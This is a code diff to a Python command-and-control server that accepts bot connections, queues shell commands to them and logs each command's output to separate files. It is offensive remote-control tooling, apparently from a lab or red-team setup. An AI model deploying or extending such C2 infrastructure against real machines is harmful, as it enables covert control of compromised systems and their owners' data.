@@ -1,4 +1,5 @@
 import socketserver
+import socket
 import uuid
 import queue
 import os
@@ -7,6 +8,7 @@ import threading
 
 connections = {}
 base_dir = '/usr/src/app/c2/'
+hello_log = '/hello_log'
 
 
 class InvalidConnUUID(Exception):
@@ -24,47 +26,53 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
         conn_folder = base_dir + conn_uuid
         os.mkdir(conn_folder)
         connections[conn_uuid] = {'cmd_queue': queue.Queue(), 'last_seen': time.time(),
-                                  'client_addr': self.client_address, 'is_alive': True, 'short_log': b''}
-        short_log_size = 100
-        log_file = conn_folder + '/log_file'
+                                  'client_addr': self.client_address, 'is_alive': True, 'num_commands': 0}
+        log_file = conn_folder + hello_log
         hello = self.request.recv(6).strip()
         log_handler = open(log_file, 'wb')
         log_handler.write(hello)
-        connections[conn_uuid]['short_log'] += hello
+        log_handler.close()
         close = False
         while not close:
             command = connections[conn_uuid]['cmd_queue'].get()
             command = command.encode()
             self.request.sendall(command + b'\n')
-            log_handler.write(b'\n' + command + b'\n')
-            connections[conn_uuid]['short_log'] += b'\n' + command + b'\n'
-            connections[conn_uuid]['short_log'] = connections[conn_uuid]['short_log'][-short_log_size:]
+            log_file = conn_folder + f'/command_{connections[conn_uuid]["num_commands"]}'
+            log_handler = open(log_file, 'wb')
+            log_handler.write(command + b'\n')
             if b'close' in command:
                 close = True
             else:
                 # TODO: per-command logic
-                # TODO: implement a poll meta-command to call 'recv' multiple times
-                try:
-                    # wait a second that more data is available
-                    time.sleep(1)
-                    data = self.request.recv(4096)
-                    log_handler.write(data)
-                    connections[conn_uuid]['short_log'] += data
-                    connections[conn_uuid]['last_seen'] = time.time()
-                except TimeoutError:
-                    data = b"\n[*] Connection closed for timeout error\n"
-                    log_handler.write(data)
-                    connections[conn_uuid]['short_log'] += data
-                    close = True
-                connections[conn_uuid]['short_log'] = connections[conn_uuid]['short_log'][-short_log_size:]
+                n_received, receiving = 0, True
+                original_timeout = self.request.gettimeout()
+                while receiving:
+                    try:
+                        # wait a second that more data is available
+                        time.sleep(1)
+                        data = self.request.recv(4096)
+                        log_handler.write(data)
+                        connections[conn_uuid]['last_seen'] = time.time()
+                        n_received += 1
+                        # decrease timeout for the next receives
+                        self.request.settimeout(2)
+                    except (TimeoutError, socket.timeout):
+                        if n_received == 0:
+                            data = b"\n[*] Connection closed for timeout error\n"
+                            log_handler.write(data)
+                            close = True
+                        else:
+                            self.request.settimeout(original_timeout)
+                        receiving = False
+            log_handler.close()
+            connections[conn_uuid]['num_commands'] += 1
         connections[conn_uuid]['is_alive'] = False
-        log_handler.close()
 
 
 def start_multithreaded_c2(config):
     host, port = '0.0.0.0', config['c2_port']
     server = socketserver.ThreadingTCPServer((host, port), C2TCPHandler)
-    server.timeout = 30
+    server.timeout = config['c2_bot_timeout']
     server_thread = threading.Thread(target=server.serve_forever)
     server_thread.start()
     return server
@@ -77,7 +85,8 @@ def list_c2_connections():
         client_addr = connections[conn_uuid]['client_addr']
         last_seen = connections[conn_uuid]['last_seen']
         is_alive = connections[conn_uuid]['is_alive']
-        conn_tuples.append((conn_uuid, client_addr, last_seen, is_alive))
+        num_commands = connections[conn_uuid]['num_commands']
+        conn_tuples.append((conn_uuid, client_addr, last_seen, is_alive, num_commands))
     return conn_tuples
 
 
@@ -90,10 +99,27 @@ def send_c2_command(conn_uuid, command):
     connections[conn_uuid]['cmd_queue'].put(command)
 
 
-def read_c2_log(conn_uuid):
+def read_c2_log(conn_uuid, index=None):
     global connections
     if conn_uuid not in connections:
         raise InvalidConnUUID
-    data = connections[conn_uuid]['short_log']
+    if index is None:
+        conn_folder = base_dir + conn_uuid
+        log_file = conn_folder + hello_log
+        with open(log_file, 'rb') as f:
+            data = f.read()
+    else:
+        try:
+            index = int(index)
+            if index < 0:
+                return "Index must be positive"
+            if index >= connections[conn_uuid]['num_commands']:
+                return "Index must be less than the number of completed commands"
+            conn_folder = base_dir + conn_uuid
+            log_file = conn_folder + f'/command_{index}'
+            with open(log_file, 'rb') as f:
+                data = f.read()
+        except ValueError:
+            return "Invalid index"
     data = data.decode(errors='replace')
     return data
